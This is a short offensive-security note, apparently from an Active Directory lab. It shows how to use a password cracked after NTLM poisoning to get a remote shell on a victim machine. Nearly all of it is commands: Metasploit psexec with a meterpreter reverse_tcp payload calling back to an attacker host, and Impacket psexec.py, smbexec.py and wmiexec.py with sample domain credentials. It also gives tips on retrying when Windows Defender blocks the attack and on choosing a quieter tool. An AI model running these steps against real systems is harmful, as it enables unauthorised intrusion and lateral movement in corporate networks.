
+ Once we cracked the credential we got after ntlm poisoning attack, we can use that credential information to gain a shell in the victim machine.
### Metasploit

```sh
$ msfconsole
~ search psexec
~ use windows/exploit/smb/psexec
# Other module to try
# use windows/exploit/smb/psexec_psh
~ show options
# set all options which we know
~ set rhosts <target ip>
~ set smbdomain <target domain: marvel.local>
~ set smbpass <cracked password>
~ set smbuser <username>
~ show options
~ set payload windows/x64/meterpreter/reverse_tcp
~ show options
~ set lhost <attacker IP>
~ set lport <listener port>
~ run
# may have to try multiple attempts
# try change the targets 

# psexec is now being detected and blocked by windows defender, but just give it a try several times.
```

### PSEXEC Script

Order to attack
Traffic level below
smbexec<wmiexec<psexec.
```sh
$ psexec.py <domain.address/username:crackedpassword@VictimIPAddress : marvel.local/fcastle:Password1@192.168.57.141>
# Pop a shell !!

# Also try other scripts
$ smbexec.py <domain.address/username:crackedpassword@VictimIPAddress : marvel.local/fcastle:Password1@192.168.57.141>

$ wmiexec.py <domain.address/username:crackedpassword@VictimIPAddress : marvel.local/fcastle:Password1@192.168.57.141>
```